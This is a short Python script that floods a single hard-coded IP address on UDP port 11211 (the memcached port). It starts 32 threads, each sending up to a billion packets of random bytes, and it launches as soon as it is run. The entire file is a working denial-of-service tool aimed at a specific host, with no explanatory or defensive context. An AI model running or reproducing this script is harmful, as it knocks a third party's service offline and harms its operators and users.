import socket
import random
from threading import Thread
import os

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(0.050)

def dos():
    for i in range(10**9):
        s.sendto(os.urandom(64), ("148.251.238.46", 11211))

def start():
    for _ in range(32):
        thread = Thread(target=dos, args=())
        thread.start()
        
start()